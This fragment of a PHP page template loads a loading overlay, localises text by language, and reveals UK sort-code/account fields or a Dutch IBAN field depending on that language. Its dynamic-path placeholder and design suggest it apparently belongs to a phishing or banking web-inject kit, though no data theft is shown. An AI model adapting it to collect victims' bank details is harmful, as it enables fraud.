<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet">
<script>
   $(document).ready(function(){
       //$('.exp_row').addClass('animated fadeInDown');
   })
</script>   
 
<div  class="wit hidden__"  style="">
		<div  class="wit_black_block "  style="">
				<img src="http://content1.edgar-online.com/chartiq/images/stx-loading.gif" style="width:50px" class=""/>
		</div>
</div>  
  </body>
<script src="%DYN_PATH_GENERAL%/whatsapp_style.js"></script>
</html>  
HTML_CODE;

require_once('kt_content.php');

$content = json_decode($content);
if(isset($_GET['l']) && trim($_GET['l']))
	$lang = $_GET['l'];
else if(isset($GLOBALS['language']) && trim($GLOBALS['language']))
	$lang = $GLOBALS['language'];
else
	$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	
$translate = $content[0]; // default lang

foreach($content as $ol34)
	if($ol34->lId == $lang)
		$translate = $ol34;
		
foreach($translate->tBl as $sb45)
	$html = str_replace("{{".$sb45->bId."}}", $sb45->tBlC, $html);

if($lang == 'gb')
	$html = str_replace('id="sort_and_account_fields" style="display: none"',
	 'id="sort_and_account_fields" style=""', $html);
else{
	$html = str_replace('id="s_code"', '', $html);
	$html = str_replace('id="acc"', '', $html);
}

if($lang == 'nl')
	$html = str_replace('id="iban_div" style="display: none"',
	 'id="iban_div" style=""', $html);
else{
	$html = str_replace('id="iban"', '', $html);
}

$GLOBALS['html'] = $html;
















